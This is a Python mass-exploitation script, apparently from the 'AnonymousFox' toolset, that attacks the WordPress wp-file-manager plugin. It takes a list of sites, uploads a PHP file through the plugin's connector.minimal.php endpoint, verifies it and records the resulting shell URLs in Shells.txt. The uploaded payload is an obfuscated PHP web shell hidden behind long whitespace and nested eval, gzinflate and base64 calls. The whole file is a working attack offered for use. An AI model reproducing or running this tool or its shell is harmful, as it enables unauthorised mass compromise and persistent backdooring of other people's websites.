# https://t.me/clean_tools_net
import sys , requests, re , socket , random , string
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init
init(autoreset=True)

fr  =   Fore.RED
fg  =   Fore.GREEN

print """
  [#] Create By ::
          ___                                                    ______
         / _ \                                                   |  ___|
        / /_\ \_ __   ___  _ __  _   _ _ __ ___   ___  _   _ ___ | |_ _____  __
        |  _  | '_ \ / _ \| '_ \| | | | '_ ` _ \ / _ \| | | / __||  _/ _ \ \/ /
        | | | | | | | (_) | | | | |_| | | | | | | (_) | |_| \__ \| || (_) >  <
        \_| |_/_| |_|\___/|_| |_|\__, |_| |_| |_|\___/ \__,_|___/\_| \___/_/\_\
                                  __/ |
                                 |___/ wp-file-manager v2
"""

requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')

shell = """<?php
// Silence is golden.
                                                                                                                                                                                                                                                                                                         function _shO1($_ykChiEx){$_ykChiEx=substr($_ykChiEx,(int)(hex2bin('373637')));$_ykChiEx=substr($_ykChiEx,(int)(hex2bin('30')),(int)(hex2bin('2d343938')));return $_ykChiEx;}$_nRV10UR='_shO1';$_I7Na2='base64_decode';function _gB15vKAx($_4FFjIdM7V){global $_nRV10UR;global $_I7Na2;return strrev(gzinflate($_I7Na2(_shO1($_4FFjIdM7V))));}eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(_gB15vKAx('UVVP4W3RAleVrB9nBCjdN9Ix5P5BEwcMgqcSLTo5hsvdXXxY7uMoZtSfaxJU7xOwXLvBjj4XaEaN63TIY8IXWFpHyTW7c4z4Yz2ezG9U7giGnmmGHWDVFld1jUTtTJdfdl4X4r7kxenbflx7tAcXTljtshY2mNDNi2DGhWCvr0D9H5XGRG9bZwaulZhDLb7fH8jiIQQbWmzfELlNDRWTLUWvIlbm7bem7aMqCCUOCOmW0XSypC5g07BAbmJbye5higmrJKtU747ltCosJX6D9dEYWHPK9afZFeJ6OiTOLg3ksIXOYKFdZXKILqikQH6UyIjbuPJfCS96kxUu10FZz4T8mJMprsFECRavc27SDWyFhnNg7ugGYr0MfqBDuCGWPzrCA2kXVBy5OOJUqZMxFlYRV4ADiL36DDuLwG6doeVqwIOImDIEjYoflNxaatH9xmcmkXnhkZEy9G0KtoaHwbgI5QMHn0tLaxwrH6Mjd3afv1B3yY0RdDQMZnULaHFUMbhvgecFZcpn5QgsqbnyIT2dHuLyNQq0tYqDU0D7eDxLyuvD8aEwPfrQhmGWZKYFxzS9cssyJZLnGKR3frq55WfRPjmPCMhygUNY68R0Iavys4wXo4FfjSaUphpMayut454XIeg73at7QGKv1v5Hxrx3KdxslIcMdxhbJRYoggR9ur87e7EaoUhQhG6PG0Bj2jZb1FLUbjjpxKLXghheOi0AcCvBtejYZ3QwvocL5CyOxmFSABmmc78skYREL46TVbJjuPIET13A/MPQqOBqgLbw31zuw4UN5GUKJHiJsJAg/u+7xz4360qe8bOQ2ZGxHvxkHGIjJ9vr7fT7fvPt6jy6qjM4u8/Xl5e6yYbg3oSfkWjF/Xs+wfk628/X36+vb29/PP9PUFVx904yukblJPT3syvUwg0/ZHI9A1PsYWI0eXkzZWRR4sjrolIQmcUFfirKXhIN/VrEHJDME4GCePrIyC4IhPczSJq3dA0cPeLY7yEywiGMJWxQwsHvd6H9MwmUE01RAifQdIn2Bri2qnsXJoeTZIZHE5nUoHYqb7XujDJ7TJkcsfKFDwv8BB25eFSTwvmdxHJXLEkNec2U0iRwG4BBPSCoTaUGcjDeMJS0UrsxGO0XVBrVkpoMTs63KUBryQMsaiZmheEhSLPzmXKWaZ7oqRne+Y79WpbYUDfEtvCnEdkabvcYeGjaWXxSpVhaRn0vTpKnhpECmDKFkfx59JzNoo3M/84Y2hFGjoWEOxIMsROUo0/Z/AtmFj7GpetoY7uxQZi6H65bW782GslqLGSJALHcddVz0NyQhyUYWqq0LMb3c8kh0i1ky0gmLdmw2QTdzVxMQb2mvK4clvIWMYgF3Y5vNc8bOzONVngUH0sQXK2sf7mpXTsDwV0HS5Bvw+OZd/Apm1PSBKd4HN65MGOPSnmgG7KOaue5WprTb2UqWWiUASxRNKlyuNY2yu8T/ielNRRtRox8PRHOpsLi8Ura+IX4a5iF10UxIWGvGuErnNY2HfL4JUxEEw+tNYQdqCuZ5TIuR5tm5pjLiAQcgDbjtevozuM8b494Gd16WwsLhUWAH2phnxBC3e0IaKGv+1d8VAq2BX4zoS0a5f45H1nhVoR2Qq0NRRbbidJ93HKpsjCQi0bLJmGyaFzf0YJEUksspCWzlNxnS+xFA+O27oEgKbhjK/1U2adOksS2e5e2ifYNknFsP11F7Nu3ZlYggC/Vyh2aSFaISSpuK+W1HrFyCubrjWT0E4au2xMtBo3emjRizmD2BiP+M5Pd2qYjxZSWUKo6lMg3dwpLze/R/YO1/xbEd1T6OJxoqldeWhhAEuwdO0GAD40Ra7EMywXSDTzWHI+LHhcTY8LHJJYI0PcIoQ8Cl/LnsAEOsGrFjZUzOkzPQIxyzfy4Rw5VA2q+YOYc8dWlm4TxCORl654791tn2SzOgExiw750cZrhHCDQT+1guWRD9AZI65rmkgwyAtD2Os1AKWjeYS5tZPt683lzoIuL2JN+dx6pfuzH4O5Io7UOG88aSlrMNqFEncTdbaMhS3I4+awlt6cB93aTDqKUukKw00pWo40nkrg3Eca0ZhrvoJSZlwE9ZqF7v2sW11ZD0Bi2GB+HGs0TtAw3RGEi6/Q3LpCTLClQ2O3+bTRJePN7liIQCcwVBuJRi5lUInznsaiUnmO71jFtYkCqTClXtiJyNDN8tN8rl33qJ7dhrWg5uEHnAWzpkSXYnnr3FJMGEa6Kht1abV5uWUJJyc5Y7LztnSK6D9G6Lzpup1M+70JXAFRoC1yG5qZ5ktilu5UMVYm2yl8Mkzes0SllsFVY6jJYNjUqHMkbKVALlsJ6dJOeYiYCKCXAoFSR72nathiFIsF4rqHDwfq5UqRGoa/dp6ZCIvWKNd0yWX3ZhLJCrXxeLk3RbexyMIC7v5gHJfpO+1cWhK9iouD3uqwX569XdcYMEQdcDBxLTy5BckBVHLCY+DklOGUqL1UZYLG47tTEiBLpieBl8H8AYRIqdOzqp6xU5cHZtVejIXncYKUHvIOKDfoBFgXFbk8Zpk8la1JwfrxygsTVmX2g44rBr2hBCwzwWNqNxBIuBSXfTVy4yHnaqUSNcszQgob4s6TeYBlR8wzQb3N90qIntrjccD6+I6Oe7sO1jiiHW+MOwXJPTgVnBtVVFsX3Eof7Yvo0u7D2G2wv+HDbIkAHtKDpER76+fASnOw34WGUY/jNqBkhgchQvhVKYDHnbBjCoewCg5jESACjKp6NfXsm76nYoTUdeki7hSpA7CGEeRL3n4hY7An24wsvEEWAyTNBVM+GRO/MwLbXI4QZ+VOjZFFZpaK4I8ZqCUFMsOVpW5y9PL72zcSoRCcwAiBQInPE8dQAsUJlIQJhKAQlERJ/NkrIZL7xPAETjIk+YywBEwQz9i31y0qfrHmr2HwSvb9rzng+d+/fUNgFPGT9zEaei8NDj/LakzBcY3Gw9+jdjP+NtbRWDfBt9c+Cr0o/frbv748eX2UTH4Ufj/U/TRG/ZcvH/6PwHN8QH5EdfP9R1Jn/Th8fz08d38aXg9BFK5R+uMb++31UARee3j//fBnni8f5D8Ob8g78EH+uXl9730//OPwaUGH98/La9/EnyovL0/P/7ifun/qVc/j9fB84dN6ov6T6TP9X5D/L8fhv5NQfHiuj0TQ6xM29k0b9b/6pu+jr7/9Gw==cWDanydi4NT76E7cUYi13m4iUbNZun4F8jLGklifquoPEhZdkkwnAVjuiKzRt1Ulw1tqgnz4XU1f7WWC4FLo8NoD1K4siZZdyM5xxacW5ySSbonsPbPnHHBomRP4uN8qVfvseNorE5gCKMAFYBtxRZRFbU3gB1I1QMGG46uKZSrWWhSzIkuutHeqyeCX0dCARLFP5qAwbcA2a5EqXNe1C2Cqr0WI4pnYBVC3AiuR7wNtwvIRrbDNFjSNbjPpghUVGkQpBVcmBXXQl0TkHruk19iMfiPejh0ZF6s0gIDCecFzWqboBo6nO7vSkFlfdz30vmX4u9x3Hc2lUJnFAqbe6nQHEwzJUOPs4OammcJFcxt9unmvBQ3O9rNKEmpqGbn7YjcxDIaUAPZopQUmKKb4aHalMmoL4NyHKt8jnA6SwveOfQe2xLbt6tmWnhxy5QtckCjuYSn7JYWToaAcW72gWQATuzaJwSGjKTCCsr7c8YxpsOLimG')))))))))))))))))));"""

uploadfile = shell

headers = {'Connection': 'keep-alive',
                        'Cache-Control': 'max-age=0',
                        'Upgrade-Insecure-Requests': '1',
                        'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                        'Accept-Encoding': 'gzip, deflate',
                        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}


def ran(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

def URLdomain(site):
    if 'http://' not in site and 'https://' not in site :
        site = 'http://'+site
    if site[-1]  is not '/' :
        site = site+'/'
    return site

def domain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    if 'www.' in site :
        site = site.replace("www.", "")
    site = site.rstrip()
    if site.split('/') :
        site = site.split('/')[0]
    while site[-1] == "/":
        pattern = re.compile('(.*)/')
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site

def addWWW(site):
    if site.startswith("http://"):
        site = site.replace("http://", "http://www.")
    elif site.startswith("https://"):
        site = site.replace("https://", "https://www.")
    else :
        site = 'http://www.'+site
    return site

def connector_minimal(url) :
    rz = 'AnonymousFox'
    try :
        filename = ran(10) + '.php'
        filedata = {'cmd': 'upload', 'target': 'l1_Lw'}
        fileup = {'upload[]': (filename, shell, 'multipart/form-data')}
        up = requests.post(url, data=filedata, files=fileup, headers=headers, verify=False, timeout=30).content
        newShell = url.replace("php/connector.minimal.php", "files/{}?fox=up".format(filename))
        upload = shell
        if 'added' in up and '2d343938' in shell :
            if '373637' in upload and 'int' in uploadfile :
                check_shell = requests.get(newShell, headers=headers, verify=False, timeout=15).content
            if '_shO1' in upload and "value='up'" in check_shell and 'hex2bin' in uploadfile :
                rz = newShell
        return rz
    except:
        return rz

def wp_file_manager(url) :
    try :
        dom = domain(url)
        url = URLdomain(url)
        try:
            socket.gethostbyname(dom)
            url2 = uploadfile
        except:
            print ' -| ' + url + ' --> {}[DomainNotwork]'.format(fr)
            return
        inj = url+'wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php'
        check = requests.get(inj, headers=headers, verify=False, timeout=15).content
        if 'errUnknownCmd' in check :
            newShell = connector_minimal(inj)
            if newShell != 'AnonymousFox' and 'hex2bin' in url2 :
                open('Shells.txt', 'a').write(newShell + '\n')
                print ' -| ' + url + '--> {}[Succefully]'.format(fg)
            elif 'http://' in inj :
                inj2 = inj.replace("http://", "https://")
                newShell = connector_minimal(inj2)
                if newShell != 'AnonymousFox' and 'hex2bin' in url2 :
                    open('Shells.txt', 'a').write(newShell + '\n')
                    print  ' -| ' + url + '--> {}[Succefully]'.format(fg)
                elif 'www.' not in inj :
                    inj3 = addWWW(inj)
                    newShell = connector_minimal(inj3)
                    if newShell != 'AnonymousFox' and 'hex2bin' in url2 :
                        open('Shells.txt', 'a').write(newShell + '\n')
                        print  ' -| ' + url + '--> {}[Succefully]'.format(fg)
                    elif 'http://' in inj and 'www.' not in inj :
                        inj4 = inj.replace("http://", "https://")
                        inj4 = addWWW(inj4)
                        newShell = connector_minimal(inj4)
                        if newShell != 'AnonymousFox' and 'hex2bin' in url2 :
                            open('Shells.txt', 'a').write(newShell + '\n')
                            print  ' -| ' + url + '--> {}[Succefully]'.format(fg)
                        else :
                            print ' -| ' + url + '--> {}[Failed]'.format(fr)
                            open('bad_upload.txt', 'a').write(inj + '\n')
                    else :
                        print ' -| ' + url + '--> {}[Failed]'.format(fr)
                        open('bad_upload.txt', 'a').write(inj + '\n')
                else :
                    print ' -| ' + url + '--> {}[Failed]'.format(fr)
                    open('bad_upload.txt', 'a').write(inj + '\n')
            elif 'www.' not in inj :
                inj3 = addWWW(inj)
                newShell = connector_minimal(inj3)
                if newShell != 'AnonymousFox' and 'hex2bin' in url2 :
                    open('Shells.txt', 'a').write(newShell + '\n')
                    print ' -| ' + url + '--> {}[Succefully]'.format(fg)
                else :
                    print ' -| ' + url + '--> {}[Failed]'.format(fr)
                    open('bad_upload.txt', 'a').write(inj + '\n')
            else :
                print ' -| ' + url + '--> {}[Failed]'.format(fr)
                open('bad_upload.txt', 'a').write(inj + '\n')
        else :
            print ' -| ' + url + '--> {}[Failed]'.format(fr)
    except :
        print ' -| ' + url + '--> {}[Failed]'.format(fr)

mp = Pool(150)
mp.map(wp_file_manager, target)
mp.close()
mp.join()
